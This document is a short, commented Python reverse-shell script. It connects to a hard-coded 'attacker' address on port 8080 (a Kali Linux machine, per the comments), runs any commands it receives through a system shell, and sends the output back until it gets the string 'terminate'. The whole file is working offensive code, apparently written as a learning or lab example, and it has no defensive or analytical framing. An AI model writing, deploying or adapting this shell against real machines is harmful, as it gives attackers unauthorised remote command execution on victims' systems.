## first import all required modules
import socket  # For Building TCP Connection
import subprocess  # To start the shell in the system
import os  # use this module for basic operation

os.system("clear || cls")  # this clears the terminal screen

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # start a socket object 's'
    s.connect(( '10.0.0.195', 8080))  # here we define the attacker IP and the listeningport
    ''' here use the kali linux ip address as a attacker ip address'''

    ter = 'terminate'  # we use this string to disconnect the connection

    while True:  # keep receiving commands from the machine
        command = s.recv(1024)  # read the first KB of the tcp socket

        if len(command) > 0:
            if ter.encode("utf-8") in command:  # close the socket and break the loop
                s.close()
                break
            else:
                cmd = subprocess.Popen (command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                output_bytes = cmd.stdout.read() + cmd.stderr.read()  #with help of send output or any error if it occures
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))

def main ():
    connect()

if __name__ == '__main__':
    main()
